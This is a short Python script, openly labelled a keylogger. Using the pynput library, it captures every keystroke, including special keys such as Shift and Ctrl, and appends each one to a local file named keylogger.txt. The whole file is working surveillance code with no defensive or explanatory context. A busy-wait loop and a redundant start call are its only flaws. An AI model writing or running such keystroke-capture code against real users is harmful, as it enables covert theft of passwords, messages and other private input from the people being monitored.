import pynput
from pynput.keyboard import Key, Listener

def on_press(key):
    try:
        if isinstance(key, Key):
            # If the key is a special key (e.g. Shift, Ctrl, Alt), write its name
            key_str = str(key).replace('Key.', '')
        else:
            # If the key is a character key, write the character
            key_str = key.char
        with open('keylogger.txt', 'a') as f:
            f.write(f'{key_str}\n')
    except Exception as e:
        print(f'Error: {e}')

# Create a flag to stop the listener
stop_listener = False

with Listener(on_press=on_press) as listener:
    # Start listening for keystrokes
    listener.start()

    # Wait until the flag is set to stop the listener
    while not stop_listener:
        # Check if the listener is still running
        if not listener.running:
            break
    
    # Stop the listener and cleanup resources
    listener.stop()

print("Keylogger stopped.")
